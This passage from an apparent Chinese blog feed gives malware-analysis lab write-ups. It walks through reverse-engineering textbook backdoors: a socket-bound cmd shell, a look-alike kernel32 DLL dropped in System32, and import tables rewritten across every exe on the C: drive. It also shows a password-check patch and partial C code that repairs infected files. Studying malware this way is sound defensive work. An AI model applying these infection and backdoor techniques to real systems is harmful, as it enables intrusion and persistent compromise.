src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763902241941.png"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763902371132.png"></p><p>运行通过，我们检验一下本机特征值</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763902458035.png" alt="服务"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763902757202.png" alt="system32目录下的源程序"></p><p>可以看到程序如我们所预料的完成了这些操作，接下来再运行一下另外几个选项，观察我们分析的结果</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763903447770.png" alt="-cc"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763903514206.png" alt="-re"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763903543161.png" alt="对应服务消失"></p><p>运行结果表明分析正确，同时要想修复至不使用密码的状态，可以再ollydbg中如此操作：</p><p>首先在ollydbg中找到对应的跳转点，0x402B01，并将jnz指令后的地址修改为参数比较地址0x402b3f，并且要修复后续参数个数的比较部分，此处我们只用到了-in，-re以及-cc，因此只对这几处参数个数进行修改（鉴于篇幅原因，此处并未列出）</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763903945858.png"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763903875087.png" alt="第一次比较参数选项"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763904061888.png"></p><p>将修改复制到可执行文件中，再对修改后的程序进行测试；结果：无需密码也可运行，修改成功！！！</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763904600229.png"></p><p>对于Lab09-01的分析就此结束。</p><h3 id="Lab09-02"><a href="#Lab09-02" class="headerlink" title="Lab09-02"></a>Lab09-02</h3><p><strong>鉴于后面的程序逐渐庞大，我们不可能每一个程序都分析如此多的篇幅，因此接下来，我将采取任务导向的方式，围绕书中的任务展开对程序的分析</strong></p><p>笔者在Lab09-01中依旧是以IDAPro为主导的，毕竟如果你真的能看懂程序源码的话，那么所有功能都自在掌握之中了（笑。但毕竟本章主题是使用Ollydbg进行动态分析，我们接下来还是回归正轨，先使用Ollydbg动态分析程序的行为，再使用IDAPro这个强大的工具吧</p><p>按照惯例，我们依旧首先进行基础的静态分析，使用strings当然是你快速了解一个程序功能的不二之选</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763983588279.png"></p><p>着重关照一下这一部分字符串，存在CreateProcessA和WS2_32.dll，我们不难猜出，可能会通过远程网络连接在本地机留下后门程序。接下来，我们现将本次书上提及的任务展示出来吧，便于读者有一个大体的方向</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763983769410.png" alt="任务"></p><p>其中第一个任务我们已经完成了。接下来看看第二个任务，为了以防万一，我们运行程序的时候还是在虚拟机中进行，同时打开Process Exploer观察恶意程序的操作</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763984070029.png"></p><p>我们可以看到该程序在PM中只有注册表的访问和文件操作，在PE中完全看不到存活状态，应该是没有执行恶意操作便直接退出了。为了验证猜测，我们现在使用Ollydbg进行动态分析。</p><p>同理，当前入口点并不是main函数，我们结合IDA信息，判断出main函数地址为0x401128，在dbg中直接步入main函数</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763984490434.png"></p><p>接下来我们向下运行，首先看到了加载到内存的一串字符以及程序获取了当前进程信息</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763984768443.png"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763984771183.png"></p><p>我们在IDA中快速梳理一下逻辑，发现了两个字符串函数strrchr和strcmp</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763984924320.png"></p><p>其中strrchr是用于获取程序名称的。并且发现在strcmp后程序立马进行了跳转。因此我们猜测，该程序通过名字是否一致来决定是否运行，在dbg中验证。发现期望程序名为ocl.exe.</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985141139.png"></p><p>如果字符串不相等，跳转以后直接到达main_end，结束程序运行。因此我们的二三问便有答案了，想要运行程序，首先得将程序名修改为ocl.exe.</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985248637.png"></p><p>我们在改名以后重新载入dbg，运行到分支点，再向下运行，经过套接字的创建和初始化以后，我们来到了程序中的自定义函数，首先步过观察一下返回情况</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985627088.png"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985668643.png" alt="函数后"></p><p>发现输入一串无意义字符以后，函数返回值为一串网址，猜测为解密函数。而这一串无意义字符正是在0x401133处赋值到栈上的，问题四解决。在IDA中大致看一下这个解密函数的操作</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985964457.png"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763985968860.png" alt="编码函数"></p><p>并且在我们也刚好解决了第五六七问：参数便是那一串无意义字符；域名为dbg中呈现的；编码函数已有图片。我们接下来分析最后一个问题，首先跳转到0x40106E.</p><p>由于教材上的网址早就失效了，所以我们进行静态分析是最为方便的，不需要修改参数。发现此处主要是修改了进程的启动信息，将标准输入输出报错等信息都重定向到了套接字中，并且无窗口的启动了一个cmd。可以推断出，此处是用于从远程主机上获取本地shell，是一个后门程序。</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986371332.png" alt="任务八"></p><h3 id="Lab09-03"><a href="#Lab09-03" class="headerlink" title="Lab09-03"></a>Lab09-03</h3><p>依然，我们首先看一下此次任务</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986574870.png" alt="03task"></p><p>既然要查看导入的dll，我们首先用PEID打开该程序，发现静态加载了4个dll</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986733973.png"></p><p>但此处并未看到题上所说的Dll.dll，所以我们还要考虑采用LoadLibrary动态加载dll库的可能性，因此我们打开IDA，查看该函数的交叉引用。发现有两处调用</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986867886.png"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986871261.png" alt="调用DLL3.dll"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763986876735.png" alt="调用user32.dll"></p><p>因此，一共调用了六个dll库。要想查看这三个DLL库的基地址，分别将他们放到PEID中查看imagebase即可，发现三个的基址都在0x10000000处</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987067505.png" alt="1"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987072096.png" alt="2"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987074503.png" alt="3"></p><p>但是程序在动态调用的过程中必然不可能将3个DLL加载到同一地址，因此我们使用Ollydbg动态分析dll分配的基址</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987340316.png"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987344031.png"></p><p>可以看到DLL1被加载到了0x10000000，DLL2被加载到了0x390000，但尚未看到DLL3地址–因为他是动态加载的，我们需要先运行到LoadLibrary后</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987499836.png" alt="加载DLL3"></p><p>接下来我们分析一下DLL1的调用函数，不难看出，该函数用于打印出DLL1的magic数字，该数字存储在0x10008030，对其交叉引用，看看写入了什么值</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987640061.png"></p><p>发现在此写入了GetCurrentProcessId的返回值，因此DLL1的magic数字为当前进程ID</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987721318.png"></p><p>接下来是第五问，我们可以看到，写入的文件名是DLL2ReturnJ的返回值，对该Dll文件进行分析</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987880044.png"></p><p>发现该函数是将0x1000B078处的值直接返回到eax中，因此我们交叉引用查看赋值的操作</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763987971714.png"></p><p>可以看到，此处创建了一个名为temp.txt的文件，并且写入了此地址。可以知道了写入的文件名就是temp.txt了。同时发现，DLL2print的数字恰好为此处变量值</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763988027007.png"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763988167129.png"></p><p>接下来分析第六个问题，我们在dbg中运行到此，发现第二个参数正是DLL3中的，因此我们打开DLL3进行分析</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763988384446.png"></p><p>可以看到Buffer是由DLL3GetStructure函数赋值的，我们具体分析该函数</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763988893793.png"></p><p>同样交叉引用分析，发现0x1000B0A0在此处赋值</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763989027236.png"><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763989304263.png"></p><p>我们再看一下DLL3会打印出什么，结合MultiByteToWideChar的操作，可以知道，WideCharStr中将存放着转换后的网址宽字符字符串</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763989304263.png"></p><p>只剩下第八问，这个很好解决，只需要我们在加载DLL时选择手工加载，并依照着Ollydbg中的地址选择加载点便可以了</p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763989558740.png" alt="手动加载入口点"></p><p><img src="/2025/11/23/e-yi-dai-ma-fen-xi-shi-zhan-lab9/1763989562341.png">看到我们已经成功在IDA中把DLL2加载到0x390000处，至此，所有任务圆满完成！！！</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab7</title>
      <link href="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/"/>
      <url>/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/</url>
      
        <content type="html"><![CDATA[<p>这一节我们将接触运用windowsAPI编写的两个恶意程序</p><p>同时会展示该如何调用windowsAPI去恢复已经被污染的exe程序</p><h3 id="Lab07-02"><a href="#Lab07-02" class="headerlink" title="Lab07-02"></a>Lab07-02</h3><p>首先我们使用strings工具对该程序进行初步的分析</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763803530331.png"></p><p>可以看到一些用于调用windows接口的函数，因此我们要使用一个新的工具Dependency walker去查询该程序的依赖项。</p><p>从而具体分析它调用了哪些函数</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763803938520.png" alt="依赖项"></p><p>得到了这样的依赖结构（我们在分析的时候会发现OLEAUT32.DLL中是通过序号引入的，此时便可以在下表中查找序号对应的函数）</p><p>我们尝试一下运行该程序</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763804066734.png"></p><p>发现其效果是试图打开一个网页</p><p>接下来使用IDA进行高级静态分析</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763804416122.png"></p><p>可以发现一开始的操作是要调用一个windows接口，我们深入其中分析一下调用的接口函数</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763804508002.png" alt="clsid和iid的具体值"></p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763805261968.png" alt="对应序号"></p><p>我们对该iid进行查询，发现其对应的接口为IWebBrowser2</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763805289182.png" alt="iid查询"></p><p>接下来再通过clsid在本地注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0002DF01-0000-0000-C000-000000000046}</code>中查询对应的程序</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763805630721.png" alt="对应着Internet Explorer"></p><p>继续我们的IDA分析，分析接下来对接口的调用部分</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763806077530.png" alt="1763806077530"></p><p>可以发现通过ecx将需要的URL赋给了pvarg这个变量，最后又调用了我们的接口，关于其具体的值，可以通过为其设置标准结构体查看</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763806466340.png"></p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763806613003.png" alt="显示出调用的函数"></p><p>Navigate函数如其名，为我们重定向到一个URL，正是之前给定的ecx中的网址</p><p>到此，该恶意程序的功能全部分析完毕</p><h3 id="Lab07-03"><a href="#Lab07-03" class="headerlink" title="Lab07-03"></a>Lab07-03</h3><p>首先使用strings进行exe分析，发现出现kernel32.dll和kerne132.dll，初步估计该程序将使用伪造的dll文件代替原有dll文件</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763806780636.png"></p><p>再分析Lab07-03.dll，看到其内部调用了这几个DLL库，猜测该dll文件中存在后门操作，通过WS2_32中的函数创建远程连接</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763806940842.png"></p><p>接下来使用IDA对两个文件进行具体分析,先来分析Lab07-03.exe</p><p>  <img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763807250245.png" alt="要求第二个参数必须存在"></p><p>首先判断程序第二个参数是否为“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”，如果不是便退出</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763807622850.png"></p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763807950184.png"></p><p>在内存中加载这两个库文件，并将Lab07-03.dll拷贝到”C:\Windows\System32\Kernel32.dll”路径下，伪装成系统文件</p><p>接下来进入sub_4011E0，查看具体发生了什么</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763808102048.png"></p><p>经过初步分析可以得知，此处递归搜索了C盘中的每一个exe程序，并且对其进行了sub_4010A0操作，我们继续深入到该函数中进行分析</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763808286645.png"><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763808304915.png"></p><p>可以看到，这段代码通过内存映射文件的方式修改一个文件的内容，具体来说是将文件的导入表中 <code>kernel32.dll</code> 替换为 <code>kerne132.dll</code>。通过对PE文件结构的解析，精准找到导入表以及对应的kernel32.dll字符串的地址再通过方框中的操作进行替换。</p><p>接下来，我们来分析另一个文件Lab07-03.dll,，由于其内部的具体流程太过复杂，我们截取其中最为关键的函数调用来分析</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763807319419.png"></p><p>通过dllmain函数的调用，我们可以得到程序的大体流程：</p><p>创建互斥量保证只有单一进程运行；远程连接到指定服务器”127.26.152.13”，并获取指令</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763811106989.png"></p><p>可能接收到3种指令，”sleep”便休眠程序1min，”q”便清理资源退出程序，”exec”便执行该字段后的指令。此时你的终端便已经被远程主机获取。</p><p>我们尝试修复该程序造成的破坏：首先，运行带有参数的恶意程序，对本地系统进行感染破坏</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763800721468.png"></p><p>查看之前分析的本地特征，确实发现存在kerne132.dll，并且C盘中的exe程序的依赖项已经被更改为kerne132.dll</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763800728405.png"></p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763800733341.png" alt="原先的依赖项"></p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763800805590.png" alt="感染后的依赖项"></p><p>接下来我们要完成一个程序，其功能是遍历C盘中的所有exe程序，并修复其导入表为真正的系统库kernel32.dll，示例代码如下（由于笔者学习时尚未熟悉内存映射方式修改文件，该段代码使用的是文件读写的方式）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_EXE_COUNT</span> <span class="token expression"><span class="token number">10240</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_PATH_LEN</span>  <span class="token expression"><span class="token number">512</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LOG_BUFFER_LEN</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token comment">// -------------------------- 全局变量 --------------------------</span>TCHAR<span class="token operator">*</span> g_exeList<span class="token punctuation">[</span>MAX_EXE_COUNT<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span>    g_exeCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// -------------------------- 函数原型声明 --------------------------</span><span class="token keyword">void</span> <span class="token function">FreeEXEList</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">ScanEXE</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>BOOL <span class="token function">RepairPE</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> exePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Pause</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 打印</span><span class="token keyword">void</span> <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    TCHAR buffer<span class="token punctuation">[</span>LOG_BUFFER_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    va_list args<span class="token punctuation">;</span>    <span class="token function">va_start</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_vstprintf_s</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> LOG_BUFFER_LEN<span class="token punctuation">,</span> format<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">va_end</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_tprintf</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//扫描</span><span class="token keyword">void</span> <span class="token function">ScanEXE</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    TCHAR searchPath<span class="token punctuation">[</span>MAX_PATH_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">_stprintf_s</span><span class="token punctuation">(</span>searchPath<span class="token punctuation">,</span> MAX_PATH_LEN<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"%s\\*.*"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>     WIN32_FIND_DATA findData<span class="token punctuation">;</span>    HANDLE hFind <span class="token operator">=</span> <span class="token function">FindFirstFile</span><span class="token punctuation">(</span>searchPath<span class="token punctuation">,</span> <span class="token operator">&amp;</span>findData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>findData<span class="token punctuation">.</span>dwFileAttributes <span class="token operator">&amp;</span> FILE_ATTRIBUTE_DIRECTORY<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_tcscmp</span><span class="token punctuation">(</span>findData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>                 <span class="token function">_tcscmp</span><span class="token punctuation">(</span>findData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                TCHAR subPath<span class="token punctuation">[</span>MAX_PATH_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">_stprintf_s</span><span class="token punctuation">(</span>subPath<span class="token punctuation">,</span> MAX_PATH_LEN<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"%s\\%s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> findData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">ScanEXE</span><span class="token punctuation">(</span>subPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            TCHAR<span class="token operator">*</span> ext <span class="token operator">=</span> <span class="token function">_tcsrchr</span><span class="token punctuation">(</span>findData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ext <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">_tcsicmp</span><span class="token punctuation">(</span>ext<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">".exe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                TCHAR<span class="token operator">*</span> fullPath <span class="token operator">=</span> <span class="token punctuation">(</span>TCHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>MAX_PATH_LEN <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TCHAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">_stprintf_s</span><span class="token punctuation">(</span>fullPath<span class="token punctuation">,</span> MAX_PATH_LEN<span class="token punctuation">,</span> <span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"%s\\%s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> findData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span>                  g_exeList<span class="token punctuation">[</span>g_exeCount<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> fullPath<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">FindNextFile</span><span class="token punctuation">(</span>hFind<span class="token punctuation">,</span> <span class="token operator">&amp;</span>findData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FindClose</span><span class="token punctuation">(</span>hFind<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 修复</span>BOOL <span class="token function">RepairPE</span><span class="token punctuation">(</span><span class="token keyword">const</span> TCHAR<span class="token operator">*</span> exePath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    BOOL result <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>     HANDLE hFile <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span> <span class="token comment">// 初始化文件句柄为无效值</span>    <span class="token comment">// 1. 打开文件</span>    hFile <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>        exePath<span class="token punctuation">,</span>        GENERIC_READ <span class="token operator">|</span> GENERIC_WRITE<span class="token punctuation">,</span>        FILE_SHARE_READ<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        OPEN_EXISTING<span class="token punctuation">,</span>        FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span>        <span class="token constant">NULL</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        DWORD err <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"打开文件失败：%s（错误码：%d）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 直接跳转到 cleanup 标签</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 2. 读取 DOS 头</span>    IMAGE_DOS_HEADER dosHeader<span class="token punctuation">;</span>    DWORD bytesRead<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dosHeader<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dosHeader<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>         bytesRead <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dosHeader<span class="token punctuation">)</span> <span class="token operator">||</span>         dosHeader<span class="token punctuation">.</span>e_magic <span class="token operator">!=</span> IMAGE_DOS_SIGNATURE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"无效的 PE 文件：%s（不是 DOS 可执行文件）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 读取失败，跳转到 cleanup</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 3. 读取 NT 头</span>    IMAGE_NT_HEADERS32 ntHeader<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SetFilePointer</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> dosHeader<span class="token punctuation">.</span>e_lfanew<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FILE_BEGIN<span class="token punctuation">)</span> <span class="token 